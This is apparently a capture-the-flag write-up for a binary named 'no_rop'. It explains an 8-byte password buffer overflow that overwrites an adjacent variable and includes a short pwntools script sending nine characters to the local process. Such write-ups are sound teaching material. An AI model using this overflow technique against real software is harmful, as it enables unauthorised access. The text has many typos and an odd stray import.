SOLUTION 1 (ida64):

Using ida64 you can easly see the flag!

SOLUTION 2 (ida64 [2]):

Analizing the code with ida64 you can see that the baff of the password is 8 chars so if you insert an >8 chars password the last char will overwrite the baff of pass variable and if it is != 0 then it will get me the flag

SOLUTION 3 (PWN):

You can see the c code so analyzing it you can see that the buffer witch contains the user input is of 8 chars so if you insert a 9 char string the pss variable will be setted as the value of the last char of the input. You can create a python script and use pwd library to do it:

from multiprocessing import process
from pwn import *

g = 'a' * 8
msg = '1'
msgin = g + msg

p = process("./no_rop")
p.sendline(msgin)
print(f"\n\n {p.recvall()}")
